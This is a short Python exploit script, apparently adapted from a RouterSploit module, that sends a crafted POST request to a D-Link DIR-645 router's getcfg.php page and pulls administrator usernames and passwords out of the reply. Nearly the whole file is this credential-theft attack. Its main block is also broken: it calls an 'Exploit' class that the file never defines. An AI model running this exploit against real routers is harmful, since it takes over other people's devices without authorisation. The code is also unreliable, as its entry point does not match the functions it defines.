target = ""
# rsf exploit module
# description: Module exploits D-Link DIR-645 password disclosure vulnerability.
import re
import requests

def exploit(target):
    try:
        data = {"SERVICES": "DEVICE.ACCOUNT"}
        response = requests.post(f"http://{target}/getcfg.php", data=data, timeout=5)
        
        if response.status_code == 200:
            regular = "<name>(.+?)</name><usrid>(|.+?)</usrid><password>(|.+?)</password>"
            creds = re.findall(regular, re.sub(r'\s+', '', response.text))
            
            if creds:
                print("[+] Credentials found!")
                for user, _, passwd in creds:
                    print(f"Username: {user}, Password: {passwd}")
                return True
        return False
    except:
        return False

def check(target):
    return exploit(target)



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
